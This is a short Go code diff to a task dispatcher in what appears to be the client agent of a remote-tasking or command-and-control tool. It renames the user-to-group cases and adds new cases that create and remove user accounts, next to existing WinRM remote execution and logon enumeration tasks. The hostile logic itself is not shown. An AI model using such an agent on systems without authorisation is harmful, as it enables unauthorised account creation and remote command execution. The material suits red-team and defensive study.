@@ -380,10 +380,14 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 	case "winrm-exec":
 		result, cmdError = exectools.WinRmExec(t.Args)
 		exectools.ResetResults()
-	case "add-user":
+	case "add-user-group":
 		result, cmdError = addusertogroup.AddUserToGroup(t.Args)
-	case "remove-user":
+	case "remove-user-group":
 		result, cmdError = addusertogroup.RemoveUserFromGroup(t.Args)
+	case "add-user":
+		result, cmdError = addusertogroup.AddUser(t.Args)
+	case "remove-user":
+		result, cmdError = addusertogroup.RemoveUser(t.Args)
 	case "enum-logons":
 		result, cmdError = enumlogons.EnumLogons()
 	default:
